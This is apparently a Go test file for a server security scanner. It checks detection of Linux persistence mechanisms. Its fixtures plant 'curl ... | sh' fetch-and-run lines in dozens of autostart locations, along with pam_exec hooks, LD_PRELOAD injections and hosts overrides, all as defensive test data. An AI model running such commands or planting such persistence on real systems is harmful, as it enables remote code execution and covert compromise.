package detect

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/Zagorsky17/ServerSecurityGo/internal/model"
)

func persistenceWrite(t *testing.T, root, path, body string) {
	t.Helper()
	path = filepath.Join(root, path)
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0600); err != nil {
		t.Fatal(err)
	}
}
func TestPersistenceExpandedCoverage(t *testing.T) {
	root := t.TempDir()
	persistenceWrite(t, root, "etc/passwd", "alice:x:1000:1000::/srv/alice:/bin/bash\nservice:x:99:99::/srv/ignored:/usr/sbin/nologin\n")
	paths := []string{"srv/alice/.bash_profile", "srv/alice/.bash_login", "srv/alice/.bash_logout", "srv/alice/.zshenv", "srv/alice/.zshrc", "srv/alice/.config/fish/config.fish", "srv/alice/.config/systemd/user/evil.service", "srv/alice/.config/autostart/evil.desktop", "srv/alice/.ssh/config", "srv/alice/.ssh/rc", "etc/environment", "etc/zsh/zshenv", "var/spool/cron/crontabs/alice", "var/spool/cron/atjobs/job", "etc/anacrontab", "etc/systemd/system/evil.service.d/override.conf", "etc/systemd/system/evil.timer", "etc/systemd/user/evil.service", "usr/lib/systemd/user/evil.service", "etc/systemd/system-generators/evil", "usr/local/lib/systemd/system-generators/evil", "etc/update-motd.d/evil", "etc/udev/rules.d/evil.rules", "etc/X11/Xsession.d/evil", "etc/init.d/evil", "etc/NetworkManager/dispatcher.d/evil", "etc/network/if-up.d/evil", "etc/apt/apt.conf.d/evil", "etc/ssh/sshrc", "opt/project/.git/hooks/post-commit", "var/www/project/.git/hooks/post-commit", "etc/logrotate.d/evil", "var/spool/incron/alice", "etc/incron.d/evil"}
	for _, p := range paths {
		persistenceWrite(t, root, p, "curl https://example.test/?password=DO_NOT_LEAK | sh\n")
	}
	persistenceWrite(t, root, "srv/ignored/.bashrc", "curl x | sh")
	findings := SystemChecksWithContext(root, time.Now(), DefaultConfig(), map[string]bool{}, nil)
	seen := map[string]bool{}
	for _, f := range findings {
		if f.ID == "autostart_suspicious" {
			seen[strings.TrimPrefix(f.Path, "/")] = true
		}
	}
	for _, p := range paths {
		if !seen[p] {
			t.Errorf("not covered: %s", p)
		}
	}
	if seen["srv/ignored/.bashrc"] {
		t.Fatal("nologin profile")
	}
	data, _ := json.Marshal(findings)
	if strings.Contains(string(data), "DO_NOT_LEAK") {
		t.Fatal("persistence secret leaked")
	}
}
func TestPersistenceSpecificChecks(t *testing.T) {
	root := t.TempDir()
	for path, body := range map[string]string{"etc/pam.d/login": "auth required pam_exec.so /tmp/check\nauth required /opt/pam_unowned.so\n", "etc/ld.so.conf.d/bad.conf": "/tmp/lib\n", "etc/hosts": "127.0.0.1 archive.ubuntu.com\n127.0.0.1 notgithub.com\n", "etc/resolv.conf": "nameserver 127.0.0.53\n", "etc/systemd/system/local.service": "[Service]\nExecStart=/usr/bin/true\n", "etc/init.d/local": "#!/bin/sh\nexit 0\n", "etc/passwd": "u:x:1000:1000::/srv/u:/bin/bash\n", "srv/u/.bash_history": ""} {
		persistenceWrite(t, root, path, body)
	}
	findings := SystemChecksWithContext(root, time.Now(), DefaultConfig(), map[string]bool{}, []*model.Process{{UID: 1000, Name: "bash"}})
	got := map[string]model.SystemFinding{}
	for _, f := range findings {
		got[f.ID] = f
	}
	for id, risk := range map[string]model.Risk{"pam_exec": model.RiskCritical, "pam_module_unusual": model.RiskHigh, "library_search_path": model.RiskHigh, "systemd_unit_no_package": model.RiskInfo, "sysv_no_package": model.RiskInfo, "hosts_override": model.RiskLow, "dns_configuration": model.RiskInfo, "shell_history_disabled": model.RiskInfo} {
		if f, ok := got[id]; !ok || f.Risk != risk {
			t.Errorf("%s %+v", id, f)
		}
	}
	unknown := SystemChecksWithContext(root, time.Now(), DefaultConfig(), nil, nil)
	for _, f := range unknown {
		if f.ID == "systemd_unit_no_package" || f.ID == "sysv_no_package" {
			t.Fatal("unknown database asserted unowned")
		}
	}
}
func TestPersistenceRejectsEscapeAndReportsLimit(t *testing.T) {
	root := t.TempDir()
	outside := t.TempDir()
	persistenceWrite(t, outside, ".bashrc", "curl x | sh")
	persistenceWrite(t, root, "etc/passwd", "u:x:1000:1000::/srv/u:/bin/bash\n")
	if err := os.MkdirAll(filepath.Join(root, "srv"), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(root, "srv/u")); err != nil {
		t.Fatal(err)
	}
	persistenceWrite(t, root, "etc/cron.d/huge", strings.Repeat("x", maxSystemFile+1))
	got := SystemChecks(root, time.Now(), DefaultConfig())
	incomplete := false
	for _, f := range got {
		if f.ID == "autostart_suspicious" {
			t.Fatal("read outside root")
		}
		incomplete = incomplete || f.Incomplete()
	}
	if !incomplete {
		t.Fatal("missing incomplete state")
	}
}

func TestSysVDirectScriptsAndPackagedLinks(t *testing.T) {
	root := t.TempDir()
	persistenceWrite(t, root, "etc/rc2.d/S99custom", "#!/bin/sh\nexit 0\n")
	persistenceWrite(t, root, "etc/init.d/packaged", "#!/bin/sh\nexit 0\n")
	if err := os.Symlink("../init.d/packaged", filepath.Join(root, "etc/rc2.d/S01packaged")); err != nil {
		t.Fatal(err)
	}
	findings := SystemChecksWithContext(root, time.Now(), DefaultConfig(), map[string]bool{"/etc/init.d/packaged": true}, nil)
	found := false
	for _, f := range findings {
		if f.ID == "sysv_no_package" {
			if f.Path != "/etc/rc2.d/S99custom" {
				t.Fatalf("packaged target marked unowned: %+v", f)
			}
			found = true
		}
	}
	if !found {
		t.Fatal("direct rc script missed")
	}
}

func TestPAMMissingOptionalVersusUnownedLibrary(t *testing.T) {
	root := t.TempDir()
	persistenceWrite(t, root, "etc/pam.d/test", "-session optional pam_optional.so\n")
	check := func(want model.Risk, owners map[string]bool) {
		t.Helper()
		got := SystemChecksWithContext(root, time.Now(), DefaultConfig(), owners, nil)
		found := false
		for _, f := range got {
			if f.ID == "pam_module_unusual" {
				found = true
				if f.Risk != want {
					t.Fatalf("%+v", f)
				}
			}
		}
		if !found {
			t.Fatal("missing PAM finding")
		}
	}
	check(model.RiskInfo, map[string]bool{})
	persistenceWrite(t, root, "usr/lib/security/pam_optional.so", "library fixture")
	check(model.RiskHigh, map[string]bool{})
	got := SystemChecksWithContext(root, time.Now(), DefaultConfig(), map[string]bool{"/usr/lib/security/pam_optional.so": true}, nil)
	for _, f := range got {
		if f.ID == "pam_module_unusual" {
			t.Fatal("package-owned library flagged")
		}
	}
}

func TestPersistenceSystemSymlinksStayInsideHostRoot(t *testing.T) {
	root := t.TempDir()
	outside := t.TempDir()
	persistenceWrite(t, root, "usr/share/profile", "curl x | sh\n")
	persistenceWrite(t, root, "dev/null", "")
	persistenceWrite(t, outside, "outside", "curl outside | sh\n")
	os.MkdirAll(filepath.Join(root, "etc/profile.d"), 0755)
	for name, target := range map[string]string{"absolute": "/usr/share/profile", "chain": "absolute", "masked": "/dev/null", "cycle": "cycle", "outside": filepath.Join(outside, "outside")} {
		if err := os.Symlink(target, filepath.Join(root, "etc/profile.d", name)); err != nil {
			t.Fatal(err)
		}
	}
	got := SystemChecks(root, time.Now(), DefaultConfig())
	hits := map[string]bool{}
	issues := ""
	for _, f := range got {
		if f.ID == "autostart_suspicious" {
			hits[f.Path] = true
		}
		if f.ID == "persistence_unavailable" {
			for _, e := range f.Evidence {
				issues += e.String() + "\n"
			}
		}
	}
	for _, p := range []string{"absolute", "chain"} {
		if !hits["/etc/profile.d/"+p] {
			t.Errorf("system symlink not inspected: %s", p)
		}
	}
	if hits["/etc/profile.d/outside"] {
		t.Fatal("escaped host root")
	}
	if strings.Contains(issues, "/masked") {
		t.Fatal("masked file marked incomplete")
	}
	if !strings.Contains(issues, "/cycle") || !strings.Contains(issues, "/outside") {
		t.Fatalf("missing incomplete paths: %s", issues)
	}
}

func TestPersistenceLineLimitIsIncomplete(t *testing.T) {
	root := t.TempDir()
	persistenceWrite(t, root, "etc/pam.d/many", strings.Repeat("# comment\n", 4097)+"auth required pam_exec.so /tmp/hidden\n")
	findings := SystemChecksWithContext(root, time.Now(), DefaultConfig(), map[string]bool{}, nil)
	found := false
	for _, f := range findings {
		if f.Path == "/etc/pam.d/many" && f.Incomplete() {
			found = true
		}
	}
	if !found {
		t.Fatal("line limit silently reported as complete")
	}
}
func FuzzPersistenceContent(f *testing.F) {
	dir := f.TempDir()
	path := filepath.Join(dir, "fixture")
	os.WriteFile(path, []byte(""), 0600)
	fi, _ := os.Stat(path)
	root, err := os.OpenRoot(dir)
	if err != nil {
		f.Fatal(err)
	}
	defer root.Close()
	f.Add([]byte("auth required pam_exec.so /tmp/check\n"))
	f.Add([]byte("session [success=ok default=ignore] pam_optional.so\n"))
	f.Add([]byte("curl x | sh\n"))
	f.Fuzz(func(t *testing.T, data []byte) {
		if len(data) > 16<<10 {
			return
		}
		got := persistenceContent("/etc/pam.d/fixture", data, fi, time.Now(), DefaultConfig(), map[string]bool{}, root)
		if len(got) > len(persistenceMessages)+3 {
			t.Fatal("unbounded findings")
		}
		for _, finding := range got {
			if len(finding.Evidence) > 12 {
				t.Fatal("unbounded evidence")
			}
		}
	})
}

func TestPersistenceExactLineBoundary(t *testing.T) {
	root := t.TempDir()
	persistenceWrite(t, root, "etc/profile", strings.Repeat("# comment\n", 4096))
	for _, f := range SystemChecks(root, time.Now(), DefaultConfig()) {
		if f.Incomplete() {
			t.Fatalf("exact line boundary: %+v", f)
		}
	}
}

func TestPAMDirectoryLimitIsIncomplete(t *testing.T) {
	root := t.TempDir()
	persistenceWrite(t, root, "etc/pam.d/test", "auth required pam_unknown.so\n")
	owners := map[string]bool{}
	for i := 0; i < 65; i++ {
		owners[fmt.Sprintf("/usr/lib/arch%d/security/pam_known.so", i)] = true
	}
	found := false
	for _, f := range SystemChecksWithContext(root, time.Now(), DefaultConfig(), owners, nil) {
		if f.Path == "/etc/pam.d/test" && f.Incomplete() {
			found = true
		}
	}
	if !found {
		t.Fatal("directory limit not reported")
	}
}

func TestClearedPreloadIsNotSuspicious(t *testing.T) {
	for _, line := range []string{`Environment="LD_PRELOAD=" OTHER=1`, `Environment=LD_PRELOAD=""`, `LD_PRELOAD=''`, `LD_PRELOAD=""`} {
		if persistPattern.MatchString(line) {
			t.Errorf("cleared preload matched: %s", line)
		}
	}
	for _, line := range []string{`LD_PRELOAD=/tmp/x.so`, `Environment="LD_PRELOAD=/usr/lib/x.so"`, `Environment=LD_PRELOAD="/usr/lib/x.so"`} {
		if !persistPattern.MatchString(line) {
			t.Errorf("preload missed: %s", line)
		}
	}
}
